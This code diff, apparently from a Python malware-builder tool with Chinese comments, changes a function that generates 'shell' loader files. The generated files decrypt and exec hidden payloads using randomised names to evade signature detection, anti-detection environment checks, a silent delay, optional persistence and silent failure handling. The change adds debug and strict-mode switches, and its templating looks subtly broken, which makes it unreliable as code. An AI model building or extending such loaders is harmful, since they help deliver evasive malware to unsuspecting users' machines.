@@ -10,8 +10,21 @@ import datetime
 from .anti_detection import create_advanced_evasion_code
 
 
-def gene_shell(encrypted_code, key, output_dir=".", filename=None, add_persistence=False, anti_detection=True, silent_delay=30):
-    """生成Shell文件"""
+def gene_shell(encrypted_code, key, output_dir=".", filename=None, add_persistence=False, 
+               anti_detection=True, silent_delay=30, debug_mode=False, strict_mode=True):
+    """生成Shell文件
+    
+    Args:
+        encrypted_code: 加密后的代码
+        key: 解密密钥
+        output_dir: 输出目录
+        filename: 文件名
+        add_persistence: 是否添加持久化
+        anti_detection: 是否启用反检测
+        silent_delay: 静默延迟时间
+        debug_mode: 调试模式，True时输出详细日志
+        strict_mode: 严格模式，False时降低反检测强度
+    """
     # 随机生成变量名以避免特征检测
     var_names = {
         's1': ''.join(random.choices(string.ascii_lowercase, k=8)),
@@ -69,17 +82,19 @@ def {obfuscated_exec}(code):
 def main_service():
     """主服务函数"""
     try:
-        # 环境检查
-        if not comprehensive_environment_check({silent_delay}):
+        # 环境检查（可配置严格程度）
+        if not comprehensive_environment_check({silent_delay}, {strict_mode}):
             return
             
+        {debug_code}
+        
         # 解码执行
         {obfuscated_exec}({base64}.b64decode({var_s2}).decode())
         {obfuscated_exec}({base64}.b64decode({var_s3}).decode())
         {decrypt_func} = locals()['decrypt']
         {obfuscated_exec}({decrypt_func}({var_s1},{var_key}))
         
-    except Exception:
+    except Exception{debug_exception}:
         # 静默失败
         pass
 
@@ -100,6 +115,20 @@ if __name__ == "__main__":
     if add_persistence:
         persistence_code = _generate_persistence_code(add_persistence)
     
+    # 调试代码（仅在调试模式下添加）
+    debug_code = ""
+    debug_exception = ""
+    if debug_mode:
+        debug_code = '''
+        # 调试信息
+        print(f"[DEBUG] 开始执行载荷...")
+        print(f"[DEBUG] 密钥: {var_key}")
+        print(f"[DEBUG] 载荷长度: {{len({var_s1})}}")
+        '''
+        debug_exception = " as e:\n        print(f'[DEBUG] 错误: {{str(e)}}')\n        import traceback; traceback.print_exc()"
+    else:
+        debug_exception = ""
+    
     # 填充模板
     content = template.format(
         timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
@@ -117,6 +146,9 @@ if __name__ == "__main__":
         decrypt_func=var_names['decrypt'],
         obfuscated_exec=''.join(random.choices(string.ascii_lowercase, k=10)),
         silent_delay=silent_delay,
+        strict_mode=str(strict_mode).lower(),
+        debug_code=debug_code,
+        debug_exception=debug_exception,
         add_persistence=str(add_persistence).lower()
     )
     
